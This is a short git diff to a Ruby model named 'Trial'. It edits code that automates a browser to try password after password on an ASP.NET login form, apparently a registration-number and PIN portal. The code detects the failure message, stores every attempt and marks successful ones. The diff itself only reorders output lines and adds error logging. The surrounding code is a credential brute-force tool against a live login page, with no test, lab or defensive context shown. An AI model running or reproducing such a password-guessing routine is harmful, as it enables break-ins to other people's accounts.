@@ -7,12 +7,13 @@ class Trial < ActiveRecord::Base
 		browser.text_field(:id, "ctl00_ContentPlaceHolder1_Password").set("#{pass}")
 		browser.button(name: "ctl00$ContentPlaceHolder1$btn_login").click
 		if browser.text.include?("Registration number and your PIN are not allowed to login")
-			puts "Failed for #{pass}"
 			Trial.create(password:pass)
+			puts "Failed for #{pass}"
 		else
-			puts "Successful for #{pass}"
 			Trial.create(password:pass, successful:true)
+			puts "Successful for #{pass}"
 		end
 	rescue => e
+		puts "Fatal error #{e}"
 	end
 end
